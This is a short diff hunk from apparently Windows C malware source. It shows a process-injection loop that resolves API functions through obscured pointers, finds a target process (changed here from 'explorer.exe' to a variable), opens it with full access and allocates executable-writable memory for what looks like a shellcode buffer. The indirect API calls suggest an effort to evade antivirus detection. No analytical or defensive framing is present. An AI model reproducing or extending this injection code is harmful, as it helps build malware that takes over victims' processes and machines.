@@ -86,7 +86,7 @@ int main() {
 
     ((BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32))pPro_firs)(snapshot, &pe32);
     while(((BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32))pPro_nex)(snapshot, &pe32)) {
-       if (strcmp(pe32.szExeFile, "explorer.exe") == 0){
+       if (strcmp(pe32.szExeFile, procmantar) == 0){
               HANDLE hProcess = ((HANDLE(WINAPI*)(DWORD, BOOL, DWORD))popen_proc)(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
               
               LPVOID clamonua = ((LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))pvirall)(hProcess, NULL, kkcodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
